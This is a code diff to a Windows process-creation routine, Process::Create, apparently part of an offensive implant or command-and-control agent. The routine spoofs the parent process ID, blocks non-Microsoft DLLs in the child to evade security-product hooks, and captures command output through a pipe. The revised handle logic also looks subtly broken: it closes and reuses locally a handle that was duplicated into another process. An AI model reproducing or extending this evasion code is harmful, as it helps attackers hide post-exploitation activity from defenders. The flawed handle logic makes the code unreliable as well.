@@ -53,13 +53,13 @@ auto DECLFN Process::Create(
     ULONG  PipeBuffSize = 0;
     UINT8  UpdateCount  = 0;
 
-    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff;
+    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff = nullptr;
     UPTR                         AttrSize;
 
     STARTUPINFOEXA      SiEx         = { 0 };
-    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };
 
-    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; }
+    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; };
     if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };
 
     SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
@@ -73,19 +73,29 @@ auto DECLFN Process::Create(
         Success = Self->Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
         if ( ! Success ) { goto _KH_END; }
     }
+
     if ( Self->Ps->Ctx.ParentID  ) {
+        PsHandle = Self->Ps->Open( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, Self->Ps->Ctx.ParentID );
+        if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
+            Success = FALSE; goto _KH_END;
+        }
+        
         Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &PsHandle, sizeof( HANDLE ), 0, 0 );
         if ( ! Success ) { goto _KH_END; }
     }
+
     if ( Self->Ps->Ctx.BlockDlls ) {
         UPTR Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
         Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UPTR ), nullptr, nullptr );
         if ( ! Success ) { goto _KH_END; }
     }
-    if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)AttrBuff;
+    
+    if ( AttrBuff ) {
+        SiEx.lpAttributeList = AttrBuff;
+    }
 
     if ( Self->Ps->Ctx.Pipe ) {
-        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
+        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, 0 ); // Use 0 for default buffer
         if ( !Success ) { goto _KH_END; }
 
         SiEx.StartupInfo.hStdError  = PipeWrite;
@@ -93,72 +103,97 @@ auto DECLFN Process::Create(
         SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
         SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
 
-        if ( Self->Ps->Ctx.ParentID ) PipeWrite = nullptr;
-    }
-
-    if ( Self->Ps->Ctx.ParentID ) {
-        PsHandle = Self->Ps->Open( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, Self->Ps->Ctx.ParentID );
-        if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
-            Success = FALSE; goto _KH_END;
-        }
-
-        if ( Self->Ps->Ctx.Pipe ) {
+        // Se for processo com parent spoofing, duplicamos o handle
+        if ( Self->Ps->Ctx.ParentID ) {
             Success = Self->Krnl32.DuplicateHandle(
-                NtCurrentProcess(), PipeWrite, PsHandle, &PipeDuplic, 0,
-                TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
+                NtCurrentProcess(), 
+                PipeWrite, 
+                PsHandle, 
+                &PipeDuplic, 
+                0,
+                TRUE, 
+                DUPLICATE_SAME_ACCESS
             );
-
-            if ( ! Success || ! PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { goto _KH_END; }
+            
+            if ( ! Success || !PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { 
+                goto _KH_END; 
+            }
+            
+            // Fecha o handle original e usa o duplicado
+            Self->Ntdll.NtClose( PipeWrite );
             PipeWrite = PipeDuplic;
+            SiEx.StartupInfo.hStdError = PipeWrite;
+            SiEx.StartupInfo.hStdOutput = PipeWrite;
         }
     }
 
     Success = Self->Krnl32.CreateProcessA(
-        nullptr, CommandLine, nullptr, nullptr, InheritHandles, PsFlags,
+        nullptr, CommandLine, nullptr, nullptr, TRUE, // IMPORTANTE: InheritHandles = TRUE
+        PsFlags,
         nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
-    if ( !Success ) { goto _KH_END; }
+
+    // Fecha o handle de escrita APÓS criar o processo
+    if ( PipeWrite ) {
+        Self->Ntdll.NtClose( PipeWrite );
+        PipeWrite = nullptr;
+    }
+
+    if ( ! Success ) { 
+        goto _KH_END; 
+    }
 
     if ( Self->Ps->Ctx.Pipe ) {
+        // Espera o processo terminar
+        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, INFINITE );
         
-        Self->Ntdll.NtClose( PipeWrite ); PipeWrite = nullptr;
-
-        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );
-
-        if (waitResult == WAIT_TIMEOUT) {
-            KhDbg( "Timeout waiting for process output" );
-        }
-
-        Success = Self->Krnl32.PeekNamedPipe(
-            PipeRead, nullptr, 0, nullptr, &PipeBuffSize, nullptr
-        );
-        if ( !Success ) { goto _KH_END; }
-
-        if ( PipeBuffSize > 0 ) {
-            PipeBuff = (BYTE*)hAlloc( PipeBuffSize );
-            if ( !PipeBuff ) { Success = FALSE; goto _KH_END; }
-            
-            Success = Self->Krnl32.ReadFile(
-                PipeRead, PipeBuff, PipeBuffSize, &TmpValue, nullptr
+        if ( waitResult == WAIT_OBJECT_0 ) {
+            // Lê o output do pipe
+            Success = Self->Krnl32.PeekNamedPipe(
+                PipeRead, nullptr, 0, nullptr, (LPDWORD)&PipeBuffSize, nullptr
             );
-            if ( !Success ) { goto _KH_END; }
-
-            KhDbg( "pipe buffer: %d", PipeBuffSize );
-            KhDbg( "pipe read  : %d", TmpValue );
-
-            Self->Ps->Out.p = PipeBuff;
-            Self->Ps->Out.s = TmpValue;
+            
+            if ( Success && PipeBuffSize > 0 ) {
+                PipeBuff = (PBYTE)hAlloc( PipeBuffSize + 1 ); // +1 para null terminator
+                if ( PipeBuff ) {
+                    Success = Self->Krnl32.ReadFile(
+                        PipeRead, PipeBuff, PipeBuffSize, (LPDWORD)&TmpValue, nullptr
+                    );
+                    
+                    if ( Success ) {
+                        // Garante null termination para string
+                        PipeBuff[TmpValue] = 0;
+                        Self->Ps->Out.p = PipeBuff;
+                        Self->Ps->Out.s = TmpValue;
+                        
+                        KhDbg( "Process output: %d bytes", TmpValue );
+                        KhDbg( "Output: %s", PipeBuff );
+                    } else {
+                        hFree( PipeBuff );
+                        PipeBuff = nullptr;
+                    }
+                }
+            } else {
+                KhDbg( "No output available or PeekNamedPipe failed" );
+            }
         } else {
-            KhDbg( "No data available in pipe" );
+            KhDbg( "Wait for process failed: %d", waitResult );
         }
     }
 
 _KH_END:
-    if ( AttrBuff  ) hFree( AttrBuff );
+    // Cleanup
+    if ( AttrBuff  ) { 
+        Self->Krnl32.DeleteProcThreadAttributeList( AttrBuff );
+        hFree( AttrBuff ); 
+    }
     if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
     if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
-    if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
-    if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );
+    if ( PsHandle  ) Self->Ntdll.NtClose( PsHandle );
+    
+    // Não fecha os handles do processo criado aqui - quem chamou a função é responsável
+    // if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
+    // if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );
 
     return Success;
 }
